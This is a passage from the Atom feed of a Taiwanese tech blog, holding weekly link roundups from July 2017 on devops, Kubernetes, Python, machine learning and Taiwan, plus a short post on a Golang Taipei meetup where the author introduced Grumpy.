&lt;/ul&gt;</summary><category term="Tech"></category></entry><entry><title>Y2017W30</title><link href="https://blog.m157q.tw/posts/2017/07/31/y2017w30/" rel="alternate"></link><published>2017-10-17T20:20:09+08:00</published><updated>2017-10-17T20:20:09+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-07-31:posts/2017/07/31/y2017w30/</id><summary type="html">&lt;h3&gt;devops&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/technology-learning/how-we-solved-authentication-and-authorization-in-our-microservice-architecture-994539d1b6e6"&gt;How We Solved Authentication and Authorization in Our Microservice Architecture&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;firefox&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/13158083/take-a-full-page-screenshot-with-firefox"&gt;shell - Take a full page screenshot with Firefox - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;才知道原來 Firefox 內建網頁截圖工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2400-support-file-support"&gt;SUPPORT file support · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;繼 CONTRIBUTING 之後，#GitHub 也把 SUPPORT 的部分從 Readme 獨立出來了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://speakerdeck.com/thesandlord/kubernetes-best-practices"&gt;Kubernetes Best Practices // Speaker Deck&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/07/linux-network-interface-dn-server-query-status-2017/amp/"&gt;Linux 各網路界面對 DNS Server 查詢的狀態 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;systemd-resolve --status&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://mp.weixin.qq.com/s/hMcJtB3Lss1NBalXRTGZlQ"&gt;如何用 Python 从海量文本抽取主题？&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://machinelearning.apple.com/2017/07/07/GAN.html"&gt;Improving the Realism of Synthetic Images - Apple&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Most successful examples of neural nets today are trained with supervision. However, to achieve high accuracy, the training sets need to be large, diverse, and accurately annotated, which is costly. An alternative to labelling huge amounts of data is to use synthetic images from a simulator.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;nosql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/fehguy/data-modeling-for-nosql"&gt;Data Modeling for NoSQL&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Upcoming SlideShare Loading in …5 × Data Modeling for NoSQL 1. Data Modeling for NoSQL Tony Tam @fehguy 2. Data Modeling? Smart Modeling makesNoSQL work 3.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/Dataversity/nosql-now-nosql-architecture-patterns-23589170?next_slideshow=1"&gt;NoSQL Now! NoSQL Architecture Patterns&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The NoSQL movement has introduced four new database architectural patterns that complement, but not replace, traditional relational and analytical databases. This presentation will introduce these ...  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://softwareengineering.stackexchange.com/questions/158790/best-practices-for-nosql-database-design"&gt;best practices for NoSQL database design - Software Engineering Stack Exchange&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Normalization in RDBMS allows you to leverage the strengths of the relational paradigm.  Denormalization in NoSQL allows you to leverage the strengths of the NoSQL paradigm.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;之前就覺得 SQL 的正規化在 NoSQL 會有問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/07/26/%e4%bd%a0%e6%89%80%e4%b8%8d%e7%9f%a5%e9%81%93%e7%9a%84-python-%e6%a8%99%e6%ba%96%e5%87%bd%e5%bc%8f%e5%ba%ab%e7%94%a8%e6%b3%95-01-sys/"&gt;你所不知道的 Python 標準函式庫用法 01 — sys | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Python of the week 不夠看了  &lt;/li&gt;
&lt;li&gt;現在有 Python of the day 而且還是繁體中文版  &lt;/li&gt;
&lt;li&gt;寫得也挺詳細的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/07/security-ios-android-wifi-broadpwn-2017/amp/"&gt;iOS、Android 遇到 Wifi 晶片漏洞 Broadpwn 需盡快更新 - Tsung's Blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/CindyLinz/Chrome-GreenifyFacebook"&gt;GitHub - CindyLinz/Chrome-GreenifyFacebook: 綠化 Facebook 畫面的 Chrome extenison&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因應中國時報的綠色恐怖寫了這個 Chrome 套件  &lt;/li&gt;
&lt;li&gt;笑死我 XDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/apan1121/powerInfo"&gt;apan1121/powerInfo&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;powerInfo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://apan1121.github.io/powerInfo/"&gt;台灣電廠即時機組發電量&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E8%BE%BE%E5%85%8B%E6%95%88%E5%BA%94"&gt;達克效應 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;達克效應（英語：D-K effect），全稱為鄧寧-克魯格效應（英語：Dunning–Kruger effect），是一種認知偏差，能力欠缺的人有一種虛幻的自我優越感，錯誤地認為自己比真實情況更加優秀。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;孔子：「知之為知之，不知為不知，是知也。」  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;查爾斯 · 達爾文：「無知比知識更容易招致自信」  &lt;/li&gt;
&lt;li&gt;莎士比亞：「愚蠢的人總認為自己很聰明，而智者卻知道自己的無知。」  &lt;/li&gt;
&lt;li&gt;警惕自己啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.destroyallsoftware.com/talks/wat"&gt;Wat&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The sarcasm in this talk does not represent anyone's actual opinion. For a more serious take on software, try Destroy All Software Screencasts: 10 to 15 minutes every other week, dense with information on advanced topics like Unix, TDD, OO Design, Vim, Ruby, and Git.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;短短五分鐘的 lightning talk 但真的講的很好笑。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="devops"></category><category term="firefox"></category><category term="github"></category><category term="joke"></category><category term="k8s"></category><category term="linux"></category><category term="machine learning"></category><category term="nosql"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category><category term="trivia"></category></entry><entry><title>Y2017W29</title><link href="https://blog.m157q.tw/posts/2017/07/25/y2017w29/" rel="alternate"></link><published>2017-10-17T20:09:40+08:00</published><updated>2017-10-17T20:09:40+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-07-25:posts/2017/07/25/y2017w29/</id><summary type="html">&lt;h3&gt;ai&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/mmc-writes/the-fourth-industrial-revolution-a-primer-on-artificial-intelligence-ai-ff5e7fffcae1"&gt;The fourth industrial revolution: a primer on Artificial Intelligence (AI)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@dennyku/%E5%9C%A8-%E6%B1%82%E8%81%B7%E5%A4%A9%E7%9C%BC%E9%80%9A-%E5%B7%A5%E4%BD%9C%E4%B8%80%E5%B9%B4%E6%98%AF%E5%80%8B%E6%80%8E%E6%A8%A3%E7%9A%84%E9%AB%94%E9%A9%97-ecf07be1a0b0"&gt;在「求職天眼通」工作一年是個怎樣的體驗 – Denny Ku – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;digital currency&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@mingderwang/%E4%BA%82%E6%95%B8%E5%A4%A0%E4%B8%8D%E5%A4%A0%E4%BA%82-d7db0003d363"&gt;亂數夠不夠亂 – mingderwang – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;原本是想在台大駭客松期間, 找出虛擬幣電子錢包是否能產生夠亂的 seed 來生成新帳號. 但這個題目並沒得到團隊內部的認同, 只好把它寫成文章跟大家一起探討.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/go-python/gopy"&gt;GitHub - go-python/gopy: gopy generates a CPython extension module from a go package.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;WARNING gopy is currently not compatible with Go&amp;gt;=1.6 and its improved CGo rules as documented in cmd/cgo.  You will need Go &amp;gt;= 1.5.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/07/19/machine-learning"&gt;監督式學習？增強學習？聽不懂的話，一定要看這篇入門的機器學習名詞解釋！ - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/dylanbeattie/status/887650814696804352"&gt;Dylan Beattie 🇪🇺 on Twitter: "One of the biggest challenges with centralized logging is establishing consensus about what log levels actually mean. Here's a quick primer. https://t.co/5UeFnfiq1h"&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the biggest challenges with centralized logging is establishing consensus about what log levels actually mean. Here's a quick primer.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img alt="logging level" src="/files/y2017w29/logging-level.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mlouielu/raises-stackoverflow"&gt;GitHub - mlouielu/raises-stackoverflow: Raises' in the source code, all's right with the Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Raises Stack Overflow Raises' in your source code, all's right with the Stack Overflow Install Please use pip to install raises  $ pip install raises   How to use? Is easy to use raises in your daily work, to help you find out raises error's answer on Stack Overflow, simply import raises to your cod  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/takluyver/flit"&gt;takluyver/flit: Simplified packaging of Python modules&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Flit is a simple way to put Python packages and modules on PyPI.  Say you're writing a module foobar—either as a single file foobar.py, or as a directory—and you want to distribute it.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pybee/ouroboros"&gt;GitHub - pybee/ouroboros: A standalone, pure Python implementation of the Python Standard Library.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Documentation for Ouroboros can be found on Read The Docs.  Ouroboros is part of the BeeWare suite. You can talk to the community through:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/11092511/python-list-of-unique-dictionaries/11092590"&gt;dictionary - Python - List of unique dictionaries - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Can anyone help me with the most efficient way to achieve this in Python?  So make a temporary dict with the key being the id. This filters out the duplicates. The values() of the dict will be the list  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/11174745/avoiding-nested-for-loops"&gt;python - Avoiding nested for loops - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;I am trying to do some parameter testing on another code using python. I need to test 6 independent parameters, but I need all of the possible combinations of them. Each parameter has a minimum, a maximum, and a step value that needs to be passed to it.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.zeroplex.tw/2017/07/blog-post_2.html"&gt;天興搬家公司 與 崔媽媽基金會 - Zeroplex 生活隨筆&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來崔媽媽基金會有做這麼多事呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://musou.watchout.tw/role-play/terror-30/"&gt;沃草→你是戒嚴時代的誰呢？←&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個個都是冤死的人啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;看 Mythbusters S05E01 才知道原來日本機關王比賽那種裝置在英文有個專有的名稱叫做 Rube Goldberg Machine  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/RSVP_(invitations)"&gt;RSVP (invitations) - Wikipedia&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來 RSVP 是法文來的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="ai"></category><category term="blog"></category><category term="digital currency"></category><category term="golang"></category><category term="machine learning"></category><category term="programming"></category><category term="python"></category><category term="taiwan"></category><category term="trivia"></category></entry><entry><title>Golang Taipei Gathering #25</title><link href="https://blog.m157q.tw/posts/2017/07/18/golang-taipei-gathering-25/" rel="alternate"></link><published>2017-07-18T23:28:36+08:00</published><updated>2017-07-18T23:28:36+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-07-18:posts/2017/07/18/golang-taipei-gathering-25/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;KKTIX: &lt;a href="https://golang.kktix.cc/events/gtg25"&gt;https://golang.kktix.cc/events/gtg25&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub: &lt;a href="https://github.com/golangtw/GolangTaiwanGathering/tree/master/meetup/gtg25"&gt;https://github.com/golangtw/GolangTaiwanGathering/tree/master/meetup/gtg25&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這次來還 GTG #21 時跟 Evan 拿票的債，&lt;br /&gt;
要下班前突然又被抓住講事情，&lt;br /&gt;
所以沒聽到第 1 場 talk，&lt;br /&gt;
到 Dcard 沒多久就直接上台講，&lt;br /&gt;
講完又遇到在 TICC 剛講完 talk 的伊達，&lt;br /&gt;
就跑去外面聊天，&lt;br /&gt;
也沒聽到下一場的 lightning talk，&lt;br /&gt;
所以這次就沒有筆記了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;19:30 ~ 20:10:  王思元 - Evenote API + Blogger API  &lt;/p&gt;
&lt;p&gt;Evernote to Blogger API 串接經驗分享  &lt;/p&gt;
&lt;p&gt;分享經驗，如何使用 Golang 串接 Evernote 以及 Blogger，製作簡單的服務，將 Evernote 筆記資料發布到 Blogger 部落格上。&lt;br /&gt;
一個簡單的 side project 解決自己的痛點  &lt;/p&gt;
&lt;p&gt;Slides: &lt;a href="https://docs.google.com/presentation/d/1WOuLZTEb8DXSxifUp9WnLvasj2XKt1Fgk3SG-x7vS8I/edit#slide=id.p"&gt;https://docs.google.com/presentation/d/1WOuLZTEb8DXSxifUp9WnLvasj2XKt1Fgk3SG-x7vS8I/edit#slide=id.p&lt;/a&gt;&lt;br /&gt;
Video: &lt;a href="https://youtu.be/i5TJEj86dWw"&gt;https://youtu.be/i5TJEj86dWw&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;20:30- 21:10:  M157Q - Grumpy  &lt;/p&gt;
&lt;p&gt;M157q: Grumpy 簡介  &lt;/p&gt;
&lt;p&gt;Grumpy 是 Google 推出的 Python to Go source-to-source compiler (transcompiler)&lt;br /&gt;
此 talk 將會簡單介紹 Grumpy 的特性：包含其用法、限制&lt;br /&gt;
並透過簡單的範例比較轉換前與轉換後的速度差異&lt;br /&gt;
最後再總結一下可能可以應用的地方及其未來發展性  &lt;/p&gt;
&lt;p&gt;Slides: &lt;a href="https://speakerdeck.com/m157q/20170718-gtg25-introduction-to-grumpy-1"&gt;https://speakerdeck.com/m157q/20170718-gtg25-introduction-to-grumpy-1&lt;/a&gt;&lt;br /&gt;
Video: &lt;a href="https://youtu.be/rsmExnsLAQs?t=6m14s"&gt;https://youtu.be/rsmExnsLAQs?t=6m14s&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;閃電秀 (Lightning Talk) 已經報名場次  &lt;/p&gt;
&lt;p&gt;21:20: HUGO-靜態網站生成器-2-分鐘上手 (林志傑)&lt;br /&gt;
Slides: &lt;a href="https://speakerdeck.com/fukuball/create-static-website-with-hugo-in-2-minutes"&gt;https://speakerdeck.com/fukuball/create-static-website-with-hugo-in-2-minutes&lt;/a&gt;&lt;br /&gt;
Video: &lt;a href="https://youtu.be/TnNqsyqM9DU"&gt;https://youtu.be/TnNqsyqM9DU&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;還有一位 Lightning Talk 的講者講 GoLearn，&lt;br /&gt;
一個用 Golang 寫的 Machine Learning Framework。&lt;br /&gt;
&lt;a href="https://github.com/sjwhitworth/golearn"&gt;https://github.com/sjwhitworth/golearn&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Video: &lt;a href="https://youtu.be/H4BNNhzun2E"&gt;https://youtu.be/H4BNNhzun2E&lt;/a&gt;  &lt;/p&gt;</summary><category term="Golang"></category></entry><entry><title>Y2017W28</title><link href="https://blog.m157q.tw/posts/2017/07/17/y2017w28/" rel="alternate"></link><published>2017-10-17T06:51:23+08:00</published><updated>2017-10-17T06:51:23+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-07-17:posts/2017/07/17/y2017w28/</id><summary type="html">&lt;h3&gt;cs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/07/10/ai-history"&gt;從人工智慧、機器學習到深度學習，你不容錯過的人工智慧簡史 - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;複習一下人工智慧簡史  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/AliasIO/Wappalyzer"&gt;GitHub - AliasIO/Wappalyzer: Cross-platform utility that uncovers the technologies used on websites.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Wappalyzer is a cross-platform utility that uncovers the technologies used on websites. It detects content management systems, eCommerce platforms, web servers, JavaScript frameworks, analytics tools and many more.  Refer to the wiki for screenshots, information on how to contribute and more.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jvns.ca/blog/2017/07/05/linux-tracing-systems/"&gt;Linux tracing systems &amp;amp; how they fit together - Julia Evans&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇介紹的工具也太多了吧...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://data.leafwind.tw/rules-of-machine-learning-traditional-chinese-da0afe0991d6"&gt;《機器學習法則》繁中版（一） – all about data&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://martin.zinkevich.org/rules_of_ml/rules_of_ml.pdf"&gt;rules_of_ml.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/p/21295010"&gt;机器学习系统丛林迷路指南 - 知乎专栏&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@kstseng/kkbox-data-game-17-06-1st-place-solution-2baa14aee5f4"&gt;KKBOX Data Game - 17.06 1st place Solution – KS Tseng – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.r2d3.us/%E5%9C%96%E8%A7%A3%E6%A9%9F%E5%99%A8%E5%AD%B8%E7%BF%92%E7%AC%AC%E4%B8%80%E7%AB%A0/"&gt;圖解機器學習&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@honglong/codetengu-%E5%90%84%E6%9C%9F%E7%9A%84-title-4d4812cfad15"&gt;CodeTengu 各期的 title – Chris Yuan, 袁昇禾 – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hellolynn.hpd.io/2017/06/09/%e5%a6%82%e4%bd%95%e5%af%ab%e5%87%ba%e4%b8%80%e7%af%87%e5%a5%bd%e6%87%82%e7%9a%84%e6%96%87%e7%ab%a0%e4%bb%a5%e5%88%a9%e6%ba%9d%e9%80%9a%ef%bc%9f%e5%85%ad%e5%a4%a7%e6%8a%80%e5%b7%a7%e5%88%86%e4%ba%ab/"&gt;如何寫出一篇好懂的文章以利溝通？六大技巧分享 – 寫點科普，請給指教。&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://data.leafwind.tw/engineering-culture-in-appier-21c6604f776a"&gt;Appier 的工程師文化 – all about data&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/07/09/7435/%e5%9c%a8%e7%a8%8b%e5%bc%8f%e7%ab%b6%e8%b3%bd%e5%be%97%e7%8d%8e%e8%b2%a0%e9%9d%a2%e7%9b%b8%e9%97%9c%e6%96%bc%e5%b7%a5%e4%bd%9c%e7%9a%84%e5%93%81%e8%b3%aa/"&gt;在程式競賽得獎負面相關於工作的品質 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Quick but dirty.  &lt;/li&gt;
&lt;li&gt;Slow but clean.  &lt;/li&gt;
&lt;li&gt;Which one?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/07/video-et3-chinese-input-tutorial-2017/amp/"&gt;影片：倚天中文系統 的宣傳教學影片 - Tsung's Blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://itaigi.tw/k/%E7%95%AA%E7%9F%B3%E6%A6%B4"&gt;iTaigi 愛台語&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://shell.twbbs.org/forums/forum/forum_posts.asp?TID=9654&amp;amp;PN=41&amp;amp;FID=6&amp;amp;PR=3"&gt;台灣貝類圖鑑討論區 (http://shells.tw/forums/forum): 「芭樂」一詞的由來&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我們市場常見的「芭樂」品種很多, 原產地在南美洲, 後經由歐洲人傳至世界各地栽種, 數百年來又經人工配種選育, 種類已多不可數, 「芭樂」華語稱為番石榴, 取其像石榴之意, 但台語的「芭樂」一詞又是怎麼來的呢?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="cs"></category><category term="github"></category><category term="linux"></category><category term="machine learning"></category><category term="misc"></category><category term="programmer"></category><category term="programming"></category><category term="taiwan"></category></entry><entry><title>Y2017W27</title><link href="https://blog.m157q.tw/posts/2017/07/10/y2017w27/" rel="alternate"></link><published>2017-10-17T06:42:47+08:00</published><updated>2017-10-17T06:42:47+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-07-10:posts/2017/07/10/y2017w27/</id><summary type="html">&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/asciinema/asciinema"&gt;asciinema/asciinema: Terminal session recorder&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Terminal session recorder and the best companion of asciinema.org.  asciinema is included in repositories of most popular package managers on Mac OS X, Linux and FreeBSD. Look for package named asciinema. See the list of available packages.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;用來錄製 Terminal 的工具，可以錄一段 CLI 操作的影片在 Project 的 README 上做說明。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/tips-to-reduce-docker-image-sizes-876095da3b34?gi=77e85c46cda2"&gt;Tips to Reduce Docker Image Sizes – Hacker Noon&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/"&gt;Daemon Sets | Kubernetes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;What is a DaemonSet? A DaemonSet ensures that all (or some) nodes run a copy of a pod. As nodes are added to the cluster, pods are added to them. As nodes are removed from the cluster, those pods are garbage collected. Deleting a DaemonSet will clean up the pods it created.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/helm"&gt;kubernetes/helm: The Kubernetes Package Manager&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/coreos/flannel"&gt;GitHub - coreos/flannel: flannel is a network fabric for containers, designed for Kubernetes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
